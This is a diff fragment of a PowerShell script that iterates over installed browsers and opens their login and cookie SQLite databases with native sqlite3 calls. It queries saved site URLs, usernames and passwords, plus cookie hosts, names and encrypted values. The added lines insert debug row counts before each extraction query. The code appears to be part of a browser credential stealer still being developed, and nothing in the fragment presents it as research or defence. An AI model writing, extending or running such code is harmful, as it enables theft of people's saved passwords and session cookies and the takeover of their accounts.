@@ -158,6 +158,15 @@ foreach ($browser in $browsers) {
       try {
         $dbPtr = openDb $loginDb $false
         if ($dbPtr -ne [IntPtr]::Zero) {
+          $cntStmt = [IntPtr]::Zero
+          if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT COUNT(*) FROM logins", -1, [ref]$cntStmt, [IntPtr]::Zero) -eq 0) {
+            if ([N]::sqlite3_step($cntStmt) -eq 100) {
+              $cntPtr = [N]::sqlite3_column_text($cntStmt, 0)
+              $loginRows = if ($cntPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($cntPtr) } else { "?" }
+              if ($loginRows -ne "0") { ts "[dbg] ${bName} logins table: ${loginRows} rows" }
+            }
+            [N]::sqlite3_finalize($cntStmt)
+          }
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT origin_url, username_value, password_value FROM logins", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
             while ([N]::sqlite3_step($stmt) -eq 100) {
@@ -190,6 +199,15 @@ foreach ($browser in $browsers) {
       try {
         $dbPtr = openDb $cookieDb $true
         if ($dbPtr -ne [IntPtr]::Zero) {
+          $cntStmt2 = [IntPtr]::Zero
+          if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT COUNT(*) FROM cookies", -1, [ref]$cntStmt2, [IntPtr]::Zero) -eq 0) {
+            if ([N]::sqlite3_step($cntStmt2) -eq 100) {
+              $cntPtr2 = [N]::sqlite3_column_text($cntStmt2, 0)
+              $ckRows = if ($cntPtr2 -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::PtrToStringAnsi($cntPtr2) } else { "?" }
+              if ($ckRows -ne "0") { ts "[dbg] ${bName} cookies table: ${ckRows} rows" }
+            }
+            [N]::sqlite3_finalize($cntStmt2)
+          }
           $stmt = [IntPtr]::Zero
           if ([N]::sqlite3_prepare_v2($dbPtr, "SELECT host_key, name, encrypted_value FROM cookies", -1, [ref]$stmt, [IntPtr]::Zero) -eq 0) {
             while ([N]::sqlite3_step($stmt) -eq 100) {
